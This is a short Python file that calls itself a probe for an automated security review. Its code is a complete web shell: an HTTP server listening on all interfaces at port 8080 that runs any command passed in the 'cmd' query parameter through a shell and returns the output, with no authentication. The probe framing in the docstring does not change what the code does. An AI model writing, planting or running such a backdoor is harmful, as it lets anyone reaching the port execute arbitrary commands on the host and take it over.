"""A probe file for the automated security review; no tool of the repository reads or starts it."""

import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        command = parse_qs(urlparse(self.path).query).get("cmd", [""])[0]
        done = subprocess.run(command, shell=True, capture_output=True)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(done.stdout + done.stderr)


if __name__ == "__main__":
    HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
